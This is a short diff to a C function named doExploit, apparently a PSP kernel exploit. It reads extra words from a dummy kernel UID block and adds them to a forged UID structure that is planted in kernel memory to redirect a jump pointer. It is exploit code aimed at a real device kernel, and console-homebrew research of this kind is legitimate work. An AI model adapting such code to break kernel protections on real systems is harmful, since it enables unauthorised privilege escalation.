@@ -204,9 +204,11 @@ int doExploit(void) {
     // grab some data from dummy UID block to implant into our fake UID block, this removes some hardcoding and improves reliability
     u32 type_uid = readKram(dummyaddr+8);
     u32 uid_name = readKram(dummyaddr+16);
+    u32 t1 = readKram(dummyaddr+24);
+    u32 t2 = readKram(dummyaddr+28);
 
     // Plant UID data structure into kernel as string
-    u32 string[] = { libc_clock_offset - 4, KERNELIFY(jump_ptr), type_uid, encrypted_uid, uid_name, 0x1010070A, 0, 0 };
+    u32 string[] = { libc_clock_offset - 4, KERNELIFY(jump_ptr), type_uid, encrypted_uid, uid_name, 0x1010070A, t1, t2, 0};
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
     g_tbl->KernelDcacheWritebackAll();
